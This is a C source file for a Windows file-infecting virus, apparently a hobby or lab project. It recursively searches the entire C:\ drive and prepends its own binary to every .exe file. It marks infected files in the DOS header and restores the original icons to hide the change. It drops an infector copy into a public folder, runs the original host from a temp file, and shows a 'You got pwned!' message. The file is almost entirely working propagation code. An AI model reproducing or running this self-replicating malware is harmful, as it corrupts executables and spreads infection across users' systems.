#include <windows.h>
#include <stdio.h>
#include <strings.h>
#include "res_cpy.h"

#define INFECTOR_PATH "C:\\Users\\Public\\Documents\\atm.exe"

WORD infectedMarker[4] = {26, 01, 20, 03};
BYTE separatorBuffer[] = {0xFF, 0x00, 0x26, 0x00, 0xFF};

void DebugInfo(const char* formatStr, ...) {
    va_list lst;
    va_start(lst, formatStr);

    char msg[512];
    vsprintf(msg, formatStr, lst);
    MessageBoxA(NULL, msg, NULL, MB_OK);

    va_end(lst);
}

void ErrorExit(const char* msg) {
    DebugInfo("%s (Error Code: %lu)\n", msg, GetLastError());
    exit(EXIT_FAILURE);
}

BOOL isStandaloneVirus() {
    char binaryPath[MAX_PATH];
    DWORD binaryPathSize = GetModuleFileNameA(NULL, binaryPath, MAX_PATH);

    if (binaryPathSize == 0 || binaryPathSize == MAX_PATH) {
        ErrorExit("Failed to get the binary path in isStandaloneVirus");
    }

    // Open the binary file
    HANDLE hBinary = CreateFileA(binaryPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBinary == INVALID_HANDLE_VALUE) {
        ErrorExit("Failed to open the binary file in isStandaloneVirus");
    }

    // Allocate memory for the dos header
    BYTE* binaryBuffer = (BYTE*)malloc(sizeof(IMAGE_DOS_HEADER));
    if (binaryBuffer == NULL) {
        CloseHandle(hBinary);
        ErrorExit("Failed to allocate memory for the dos header in isStandaloneVirus");
    }

    // Read the dos header
    DWORD bytesRead;
    if (!ReadFile(hBinary, binaryBuffer, sizeof(IMAGE_DOS_HEADER), &bytesRead, NULL) || bytesRead != sizeof(IMAGE_DOS_HEADER)) {
        CloseHandle(hBinary);
        free(binaryBuffer);
        ErrorExit("Failed to read the binary file in isStandaloneVirus");
    }

    CloseHandle(hBinary);

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)binaryBuffer;
    if (memcmp(dos_header->e_res, infectedMarker, sizeof(dos_header->e_res)) == 0){
        return FALSE;
    }

    return TRUE;
}

DWORD getViralSize() {
    char binaryPath[MAX_PATH];
    DWORD binaryPathSize = GetModuleFileNameA(NULL, binaryPath, MAX_PATH);

    if (binaryPathSize == 0 || binaryPathSize == MAX_PATH) {
        ErrorExit("Failed to get the binary path in getViralSize");
    }

    // Open the binary file
    HANDLE hBinary = CreateFileA(binaryPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBinary == INVALID_HANDLE_VALUE) {
        ErrorExit("Failed to open the binary file in getViralSize");
    }

    DWORD dosHeaderSize = sizeof(IMAGE_DOS_HEADER);
    if (dosHeaderSize == INVALID_FILE_SIZE) {
        CloseHandle(hBinary);
        ErrorExit("Failed to get the dos header size in getViralSize");
    }

    // Allocate memory for the binary content
    BYTE* binaryBuffer = (BYTE*)malloc(dosHeaderSize);
    if (binaryBuffer == NULL) {
        CloseHandle(hBinary);
        ErrorExit("Failed to allocate memory for the dos header file in getViralSize");
    }

    // Read the binary content
    DWORD bytesRead;
    if (!ReadFile(hBinary, binaryBuffer, dosHeaderSize, &bytesRead, NULL) || bytesRead != dosHeaderSize) {
        CloseHandle(hBinary);
        free(binaryBuffer);
        ErrorExit("Failed to read the binary file in getViralSize");
    }

    CloseHandle(hBinary);

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)binaryBuffer;

    if (isStandaloneVirus()) { // If it's standalone virus
        return GetFileSize(hBinary, NULL); // just get the binary file size
    }

    return dos_header->e_res2[0]; // If I was infected, get the virus size written when I was infected
}

// RETURN THE ORIGINAL FILE OFFSET
DWORD PrependViralToTarget(const char* targetFilePath, DWORD viralSize) {
    char binaryPath[MAX_PATH];
    DWORD binaryPathSize = GetModuleFileNameA(NULL, binaryPath, MAX_PATH);

    if (binaryPathSize == 0 || binaryPathSize == MAX_PATH) {
        ErrorExit("Failed to get the binary path");
    }

    // Open the binary file
    HANDLE hBinary = CreateFileA(binaryPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBinary == INVALID_HANDLE_VALUE) {
        DebugInfo("binaryPath: %s", binaryPath);
        ErrorExit("Failed to open the binary file");
    }

    DWORD binaryFileSize = viralSize;

    // Allocate memory for the binary content
    BYTE* binaryBuffer = (BYTE*)malloc(binaryFileSize);
    if (binaryBuffer == NULL) {
        CloseHandle(hBinary);
        ErrorExit("Failed to allocate memory for the binary content");
    }

    // Read the binary content
    DWORD bytesRead;
    if (!ReadFile(hBinary, binaryBuffer, binaryFileSize, &bytesRead, NULL)) {
        CloseHandle(hBinary);
        free(binaryBuffer);
        ErrorExit("Failed to read the binary file in PrependViralToTarget");
    }

    CloseHandle(hBinary);

    // Mark the virus as infected ( and subsequently the target file by prepending to it )
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)binaryBuffer;
    memcpy(dos_header->e_res, infectedMarker, sizeof(dos_header->e_res));

    // Open the target file
    HANDLE hTargetFile = CreateFileA(targetFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTargetFile == INVALID_HANDLE_VALUE) {
        free(binaryBuffer);
        ErrorExit("Failed to open the target file");
    }

    DWORD targetFileSize = GetFileSize(hTargetFile, NULL);
    if (targetFileSize == INVALID_FILE_SIZE) {
        CloseHandle(hTargetFile);
        free(binaryBuffer);
        ErrorExit("Failed to get the target file size");
    }

    // Allocate memory for the target file content
    BYTE* targetBuffer = (BYTE*)malloc(targetFileSize);
    if (targetBuffer == NULL) {
        CloseHandle(hTargetFile);
        free(binaryBuffer);
        ErrorExit("Failed to allocate memory for the target file content");
    }

    // Read the target file content
    if (!ReadFile(hTargetFile, targetBuffer, targetFileSize, &bytesRead, NULL) || bytesRead != targetFileSize) {
        CloseHandle(hTargetFile);
        free(binaryBuffer);
        free(targetBuffer);
        ErrorExit("Failed to read the target file");
    }

    CloseHandle(hTargetFile);

    // Check if target file is infected
    dos_header = (PIMAGE_DOS_HEADER)targetBuffer;
    if (memcmp(dos_header->e_res, infectedMarker, sizeof(dos_header->e_res)) == 0) {
        DebugInfo("Target file already infected\n");
        return;
    }

    DebugInfo("Target file not already infected\n");

    // Open the target file for writing
    hTargetFile = CreateFileA(targetFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTargetFile == INVALID_HANDLE_VALUE) {
        free(binaryBuffer);
        free(targetBuffer);
        ErrorExit("Failed to open the target file for writing");
    }

    // Write the binary content to the target file
    DWORD bytesWritten;
    if (!WriteFile(hTargetFile, binaryBuffer, binaryFileSize, &bytesWritten, NULL) || bytesWritten != binaryFileSize) {
        CloseHandle(hTargetFile);
        free(binaryBuffer);
        free(targetBuffer);
        ErrorExit("Failed to write the binary content to the target file");
    }

    CloseHandle(hTargetFile);

    // Restore original file icon
    RestoreResources(targetFilePath);

    // // Mark virus size
    // dos_header = (PIMAGE_DOS_HEADER)binaryBuffer;
    // dos_header->e_res2[0] = binaryFileSize;

    DWORD origFileOffset = GetFileSize(hTargetFile, NULL);

    // Write the original target file content to the target file
    if (!WriteFile(hTargetFile, targetBuffer, targetFileSize, &bytesWritten, NULL) || bytesWritten != targetFileSize) {
        CloseHandle(hTargetFile);
        free(binaryBuffer);
        free(targetBuffer);
        ErrorExit("Failed to write the original target file content to the target file");
    }

    CloseHandle(hTargetFile);
    free(binaryBuffer);
    free(targetBuffer);
}

void cutOriginalToTmp(DWORD originalFileOffset, LPSTR szTempFileName) {
    HANDLE hTempFile = INVALID_HANDLE_VALUE;
    HANDLE hSelfFile = INVALID_HANDLE_VALUE;

    // Write original file to tmp file
    CHAR lpTempPathBuffer[MAX_PATH];

    BYTE* originalFileBuf = NULL;

    char selfPath[MAX_PATH];
    
    DWORD originalFileSize;
    DWORD selfSize;
    DWORD dwTmpPathRetVal = 0;
    DWORD dwBytesRead;
    DWORD dwTmpWrittenCnt;

    UINT uTmpFileRetVal  = 0; 

    // Get path of processes' self executable
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    // Open executable file
    hSelfFile = CreateFileA(selfPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSelfFile == INVALID_HANDLE_VALUE) {
        ErrorExit("Failed to open the self file");
    }

    // Get the file size
    selfSize = GetFileSize(hSelfFile, NULL);
    if (selfSize == INVALID_FILE_SIZE) {
        CloseHandle(hSelfFile);
        ErrorExit("Failed to get the self file size");
    }
    originalFileSize = selfSize - originalFileOffset;

    // Allocate memory for the original file content
    originalFileBuf = (BYTE*)malloc(originalFileSize);
    if (originalFileBuf == NULL) {
        CloseHandle(hSelfFile);
        ErrorExit("Failed to allocate memory for the original file content");
    }

    // Seek file pointer to original file content
    SetFilePointer(hSelfFile, originalFileOffset, NULL, FILE_BEGIN);

    // Read the original file content
    if (!ReadFile(hSelfFile, originalFileBuf, originalFileSize, &dwBytesRead, NULL) || dwBytesRead != originalFileSize) {
        CloseHandle(hSelfFile);
        free(originalFileBuf);
        ErrorExit("Failed to read the target file");
    }

    CloseHandle(hSelfFile);

    //  Gets the temp path env string (no guarantee it's a valid path).
    dwTmpPathRetVal = GetTempPath(MAX_PATH,          // length of the buffer
                           lpTempPathBuffer); // buffer for path 
    if (dwTmpPathRetVal > MAX_PATH || (dwTmpPathRetVal == 0))
    {
        ErrorExit("GetTempPath failed");
    }

    //  Generates a temporary file name. 
    uTmpFileRetVal = GetTempFileName(lpTempPathBuffer, // directory for tmp files
                              TEXT("DEMO"),     // temp file name prefix 
                              0,                // create unique name 
                              szTempFileName);  // buffer for name 
    if (uTmpFileRetVal == 0)
    {
        ErrorExit("GetTempFileName failed");
    }

    //  Creates the new file to write to for the upper-case version.
    hTempFile = CreateFileA((LPCSTR) szTempFileName, // file name 
                           GENERIC_WRITE,        // open for write 
                           0,                    // do not share 
                           NULL,                 // default security 
                           CREATE_ALWAYS,        // overwrite existing
                           FILE_ATTRIBUTE_NORMAL,// normal file 
                           NULL);                // no template 
    if (hTempFile == INVALID_HANDLE_VALUE) 
    { 
        ErrorExit("Second CreateFile failed");
    }

    // Write original file to tmp file
    if (!WriteFile(hTempFile, originalFileBuf, originalFileSize,  &dwTmpWrittenCnt, NULL) || dwTmpWrittenCnt != originalFileSize) {
        ErrorExit("Failed writing to tmp file\n");
    }

    CloseHandle(hTempFile);
    DebugInfo("Original executable written to: %s\n", szTempFileName);
}

void runTmp(LPSTR lpTmpFilePath) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    // Start the child process. 
    if( !CreateProcessA( NULL,   // No module name (use command line)
        lpTmpFilePath,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        DebugInfo( "CreateProcess failed (%d).\n", GetLastError() );
        return;
    }

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}

DWORD SaveOldIcon(LPCSTR szExeFileName, LPVOID pResData) {
    HMODULE hSrcModule;
    HRSRC hResInfo;
    HGLOBAL hResData;
    DWORD resSize;

    // Load the source executable module
    hSrcModule = LoadLibraryA(szExeFileName);
    if (hSrcModule == NULL) {
        ErrorExit("Failed to load source executable.\n");
    }    

    // Find the icon resource in the source executable
    hResInfo = FindResourceA(hSrcModule, MAKEINTRESOURCE(1), RT_GROUP_ICON);
    if (hResInfo == NULL) {
        FreeLibrary(hSrcModule);
        ErrorExit("Failed to find icon resource in source executable.\n");
    }

    // Load the icon resource
    hResData = LoadResource(hSrcModule, hResInfo);
    if (hResData == NULL) {
        FreeLibrary(hSrcModule);
        ErrorExit("Failed to load icon resource.\n");
    }

    // Get the size of the icon resource
    resSize = SizeofResource(hSrcModule, hResInfo);
    if (resSize == 0) {
        FreeLibrary(hSrcModule);
        ErrorExit("Failed to get size of icon resource.\n");
    }

    // Get a pointer to the icon resource data
    pResData = LockResource(hResData);
    if (pResData == NULL) {
        FreeLibrary(hSrcModule);
        ErrorExit("Failed to lock icon resource.\n");
    }

    return resSize;
}

void UpdateExeIcon(LPCSTR szDestExeFileName, LPVOID pResData, DWORD resSize) {
    HANDLE hUpdateRes;

    // Begin resource update on the destination executable
    hUpdateRes = BeginUpdateResourceA(szDestExeFileName, FALSE);
    if (hUpdateRes == NULL) {
        ErrorExit("Failed to begin resource update.\n");
    }

    // Update the icon resource in the destination executable
    if (!UpdateResourceA(hUpdateRes, RT_GROUP_ICON, MAKEINTRESOURCE(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pResData, resSize)) {
        EndUpdateResourceA(hUpdateRes, TRUE);
        ErrorExit("Failed to update icon resource.\n");
    }

    // End resource update
    if (!EndUpdateResourceA(hUpdateRes, FALSE)) {
        ErrorExit("Failed to end resource update.\n");
    }
}

BOOL CheckCentralFile() {
    DWORD attributes = GetFileAttributesA(INFECTOR_PATH);
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        // Error handling could be added here if needed
        return FALSE; // File does not exist
    }
    return TRUE; // File exists
}

void InfectFile(char *targetFilePath) {

    DWORD viralSize = getViralSize();
    // DWORD originalOffset = viralSize + sizeof(separatorBuffer);

    // Save old icon
    SaveOldResources(targetFilePath, 512);

    // Prepend the virus
    PrependViralToTarget(targetFilePath, viralSize);

    DebugInfo("Successfully prepended binary to the file.");



    DebugInfo("Resources successfully restored to %s\n", targetFilePath);

    // if (isStandaloneVirus == 1) {
    //     DebugInfo("This is the initial virus\n");
    //     exit(EXIT_SUCCESS);
    // }

    // CHAR tmpFilePath[MAX_PATH];
    // cutOriginalToTmp(originalOffset, tmpFilePath);

    // runTmp(tmpFilePath);

    // if (!DeleteFileA(tmpFilePath)) {
    //     ErrorExit("Failed to delete temporary file!\n");
    // }
    // DebugInfo("Temp file deleted\n");
}

void FindExecutables(const char* path) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char searchPath[MAX_PATH];
    char filePath[MAX_PATH];
    
    // Prepare the search path
    snprintf(searchPath, MAX_PATH, "%s\\*.*", path);
    
    hFind = FindFirstFile(searchPath, &findFileData);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed for path: %s\n", path);
        return;
    }
    
    do {
        // Skip the current directory and the parent directory entries
        if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0 && strcmp(findFileData.cFileName, "$Recycle.Bin") != 0) {
            snprintf(filePath, MAX_PATH, "%s\\%s", path, findFileData.cFileName);
            
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // If it is a directory, recursively search inside it
                printf("Entering directory: %s\n", filePath);
                FindExecutables(filePath);
            } else {
                // Check if the file is an executable
                const char *validExtension = ".exe";
                if (strlen(filePath) > strlen(validExtension) &&
                    _stricmp(filePath + strlen(filePath) - strlen(validExtension), validExtension) == 0) {
                    printf("Executable found: %s\n", filePath);
                    InfectFile(filePath);
                }
            }
        }
    } while (FindNextFile(hFind, &findFileData) != 0);
    
    FindClose(hFind);
}

void MalitiousCode() {
    MessageBoxA(NULL, "You got pwned!", NULL, MB_OK);
}

BOOL isInfector() {
    char binaryPath[MAX_PATH];
    DWORD binaryPathSize = GetModuleFileNameA(NULL, binaryPath, MAX_PATH);

    if (binaryPathSize == 0 || binaryPathSize == MAX_PATH) {
        ErrorExit("Failed to get the binary path");
    }

    // DebugInfo("binary path: %s\n", binaryPath);
    // DebugInfo("infector path: %s\n", INFECTOR_PATH);

    if (strcmp(binaryPath, INFECTOR_PATH) == 0) {
        return TRUE;
    }

    return FALSE;
}

void CreateInfector() {
    DWORD binaryFileSize = getViralSize();

    char binaryPath[MAX_PATH];
    DWORD binaryPathSize = GetModuleFileNameA(NULL, binaryPath, MAX_PATH);

    if (binaryPathSize == 0 || binaryPathSize == MAX_PATH) {
        ErrorExit("Failed to get the binary path");
    }

    // Open the binary file
    HANDLE hBinary = CreateFileA(binaryPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBinary == INVALID_HANDLE_VALUE) {
        ErrorExit("Failed to open the binary file in CreateInfector");
    }

    // Allocate memory for the binary content
    BYTE* binaryBuffer = (BYTE*)malloc(binaryFileSize);
    if (binaryBuffer == NULL) {
        CloseHandle(hBinary);
        ErrorExit("Failed to allocate memory for the binary content");
    }

    // Read the binary content
    DWORD bytesRead;
    if (!ReadFile(hBinary, binaryBuffer, binaryFileSize, &bytesRead, NULL)) {
        CloseHandle(hBinary);
        free(binaryBuffer);
        ErrorExit("Failed to read the binary file");
    }

    CloseHandle(hBinary);

    // Create infector
    HANDLE hInfector = CreateFileA(INFECTOR_PATH, // file name 
                        GENERIC_WRITE,        // open for write 
                        0,                    // do not share 
                        NULL,                 // default security 
                        CREATE_ALWAYS,        // overwrite existing
                        FILE_ATTRIBUTE_NORMAL,// normal file 
                        NULL);                // no template 

    if (hInfector == INVALID_HANDLE_VALUE) 
    { 
        ErrorExit("Failed creating infector");
    }

    DWORD bytesWritten;
    if (!WriteFile(hInfector, binaryBuffer, binaryFileSize, &bytesWritten, NULL) || bytesWritten != binaryFileSize) {
        CloseHandle(hInfector);
        free(binaryBuffer);
        ErrorExit("Failed to write the binary content to the infector file");
    }

    CloseHandle(hInfector);
    DebugInfo("Infector written to: %s\n", INFECTOR_PATH);
}

void ExecuteOriginalProgram() {
    DWORD viralSize = getViralSize();

    if (isStandaloneVirus()) {
        DebugInfo("This is a standalone virus");
        return;
    }

    DWORD originalOffset = viralSize + sizeof(separatorBuffer);

    CHAR tmpFilePath[MAX_PATH];
    cutOriginalToTmp(originalOffset, tmpFilePath);

    runTmp(tmpFilePath);

    if (!DeleteFileA(tmpFilePath)) {
        ErrorExit("Failed to delete temporary file!\n");
    }
    DebugInfo("Temp file deleted\n");

    
}

int main(int argc, char* argv[]) {
    ExecuteOriginalProgram();

    BOOL centralFileExists = CheckCentralFile();

    if (!centralFileExists) {
        MessageBoxA(NULL, "Machine not infected yet", NULL, MB_OK);

        CreateInfector();

        FindExecutables("C:\\");
        
    } else {

        if (!isInfector()) {
            MessageBoxA(NULL, "Machine already infected", NULL, MB_OK);
        } else {
            MessageBoxA(NULL, "I am infector", NULL, MB_OK);
            
        }
    }

    

    MalitiousCode();

    return EXIT_SUCCESS;
}